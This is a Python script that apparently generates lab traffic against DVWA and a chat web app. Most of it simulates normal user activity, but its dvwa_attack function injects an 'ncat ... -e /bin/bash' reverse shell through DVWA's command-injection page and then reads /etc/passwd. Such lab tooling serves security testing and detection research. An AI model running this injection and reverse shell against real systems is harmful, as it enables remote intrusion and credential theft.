import os
import time
import pprint
import random
import socket
import getpass
import datetime
import threading
from colorama import Fore, Style
from essential_generators import DocumentGenerator
from webLib import create_driver, dvwa_login, dvwa_command_injection, dvwa_xss_reflected, move_2_link, change_security, chat_web_application_login, chat_web_application_signup_, chat_web_application_search_user, chat_web_application_send_msg, chat_web_application_logout

def dvwa(args):
    base_url = args["url"]
    username = "admin"
    password = "password"
    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    actions = ["dvwa_command_injection","dvwa_xss_reflected","move_2_link"]

    dvwa_login(driver, base_url, username, password)
    for i in range(int(args["nb_actions"])):
        action = random.choices(actions, weights=[1,1,8])
        time.sleep(random.randint(2,20))
        if action == ["dvwa_command_injection"]:
            print(" => "+str(action[0])+" -- "+time.strftime("%H:%M:%S", time.localtime()))
            dvwa_command_injection(driver, base_url, "8.8.8.8")
        elif action == ["dvwa_xss_reflected"]:
            print(" => "+str(action[0])+"     -- "+time.strftime("%H:%M:%S", time.localtime()))
            dvwa_xss_reflected(driver, base_url, getpass.getuser())
        elif action == ["move_2_link"]:
            print(" => "+str(action[0])+"            -- "+time.strftime("%H:%M:%S", time.localtime()))
            move_2_link(driver)

    driver.close()
    driver.quit()

def dvwa_attack(args):
    ##### Prepare attack hacker side
    my_port = random.randint(4000,4999)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((('',my_port)))
    s.listen(10)

    ##### Attack victim side
    base_url = args["url"]
    username = "admin"
    password = "password"
    # my_ip = socket.gethostbyname(socket.gethostname())
    my_ip = os.popen("hostname -I").read().split(" ")[0]
    driver = create_driver()
    driver.implicitly_wait(10)

    dvwa_login(driver, base_url, username, password)
    change_security(driver, base_url)
    dvwa_command_injection(driver, base_url, "8.8.8.8; ncat "+my_ip+" "+str(my_port)+" -e /bin/bash")

    ##### Attack hacker side
    while True:
        s.settimeout(60)
        s.listen(5)
        try:
            client, address = s.accept()
        except:
            print(Fore.RED+"Attack failed!"+Style.RESET_ALL)
            break
        print(address,"connected!")
        if address:
            current_time = time.strftime("%H:%M:%S", time.localtime())
            print("Attack begin at:",current_time)
            client.send(b'cat /etc/passwd\n')
        response = client.recv(1024)
        if response != "":
            print(Fore.GREEN+"Attack was successfull!"+Style.RESET_ALL)
            print(response)
            break

    s.close()
    driver.close()
    driver.quit()

def chat_web_application_signup(args):
    base_url = args["url"]
    username = args["username"]
    email = args["email"]
    password = args["password"]
    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    chat_web_application_signup_(driver, base_url, username, email, password)

    driver.close()
    driver.quit()

def chat_web_application(args):
    base_url = args["url"]
    username = args["username"]
    receivers = args["receivers"]
    password = args["password"]
    
    gen = DocumentGenerator()

    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    if chat_web_application_login(driver, base_url, username, password) == 0:
        for i in range(int(args["nb_actions"])):
            receiver = random.choice(receivers)
            if chat_web_application_search_user(driver, receiver, verbose=False) == 0:
                chat_web_application_send_msg(driver, receiver, gen.sentence())
    
        chat_web_application_logout(driver, verbose=False)
    time.sleep(10)
    driver.close()
    driver.quit()

# args = {}
# args["nb_actions"] = "1"
# args["url"] = "http://10.159.8.36/"
# args["username"] = "usera"
# args["email"] = "usera@company.com"
# args["password"] = "user123"
# args["receivers"] = ["user1"]
# args["proxy"] = ""
# chat_web_application_signup(args)
# chat_web_application(args)
